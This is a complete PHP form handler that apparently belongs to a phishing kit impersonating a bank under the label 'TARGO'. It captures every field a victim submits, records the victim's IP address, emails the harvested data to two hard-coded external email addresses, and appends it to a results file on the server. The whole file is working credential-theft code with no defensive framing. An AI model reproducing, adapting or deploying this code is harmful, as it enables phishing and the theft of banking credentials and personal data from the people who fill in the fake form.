<?php
$to = "dksp3r@gmail.com,wh004mi@zoho.com";


function getUserIP()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
    {
      $ip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check ip is pass from proxy
    {
      $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
      $ip=$_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}


$subject = 'TARGO : ' . getUserIP();
$m_string = 'ip: '.getUserIP() . "\r\n";
$data = $_POST;
//array_walk($data, create_function('\r\n$i,$k','$i=" $k=\"$i\"";'));
$data = array_map(function($value, $key) {
    if($key != "submit_x" && $key != "submit_y") return $key.' = '.trim($value).'';
}, array_values($data), array_keys($data));


$m_string .= implode("\r\n",$data);

@mail($to, $subject, $m_string);

$myfile = file_put_contents('../results.txt', $m_string.PHP_EOL , FILE_APPEND);


?>